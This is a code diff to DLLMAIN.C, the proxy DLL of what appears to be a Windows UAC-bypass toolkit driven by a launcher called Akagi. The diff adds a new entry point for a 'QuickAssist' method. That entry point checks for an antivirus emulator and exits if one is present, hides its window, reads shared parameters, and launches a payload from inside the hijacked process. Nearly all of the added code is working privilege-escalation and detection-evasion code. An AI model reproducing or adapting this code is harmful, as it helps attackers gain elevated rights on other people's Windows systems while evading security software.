@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2014 - 2024
+*  (C) COPYRIGHT AUTHORS, 2014 - 2025
 *
 *  TITLE:       DLLMAIN.C
 *
-*  VERSION:     3.66
+*  VERSION:     3.68
 *
-*  DATE:        03 Apr 2024
+*  DATE:        07 Mar 2025
 *
 *  Proxy dll entry point.
 *
@@ -313,7 +313,7 @@ VOID WINAPI EntryPointUIAccessLoader2(
 *
 * Purpose:
 *
-* Entry point to be used consent sxs method.
+* Entry point to be used by consent sxs method.
 *
 */
 BOOL WINAPI EntryPointSxsConsent(
@@ -365,5 +365,62 @@ BOOL WINAPI EntryPointSxsConsent(
         }
 
     }
+    return TRUE;
+}
+
+/*
+* EntryPointBackupLocked
+*
+* Purpose:
+*
+* Entry point to be used by QuickAssist method.
+*
+*/
+BOOL WINAPI EntryPointBackupLocked(
+    _In_ HINSTANCE hinstDLL,
+    _In_ DWORD fdwReason,
+    _In_ LPVOID lpvReserved
+)
+{
+    BOOL bSharedParamsReadOk;
+    PWSTR lpParameter;
+    ULONG cbParameter;
+
+    UNREFERENCED_PARAMETER(lpvReserved);
+
+    ucmDbgMsg(LoadedMsg);
+
+    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED)
+        RtlExitUserProcess('foff');
+
+    if (fdwReason == DLL_PROCESS_ATTACH) {
+
+        ucmHideMainWindow();
+        LdrDisableThreadCalloutsForDll(hinstDLL);
+
+        //
+        // Read shared params block.
+        //
+        RtlSecureZeroMemory(&g_SharedParams, sizeof(g_SharedParams));
+        bSharedParamsReadOk = ucmReadSharedParameters(&g_SharedParams);
+        if (bSharedParamsReadOk) {
+            lpParameter = g_SharedParams.szParameter;
+            cbParameter = (ULONG)(_strlen(g_SharedParams.szParameter) * sizeof(WCHAR));
+        }
+        else {
+            lpParameter = NULL;
+            cbParameter = 0UL;
+        }
+
+        ucmLaunchPayload3(lpParameter, cbParameter);
+
+        //
+        // Notify Akagi.
+        //
+        if (bSharedParamsReadOk) {
+            ucmSetCompletion(g_SharedParams.szSignalObject);
+        }
+    }
+
     return TRUE;
 }
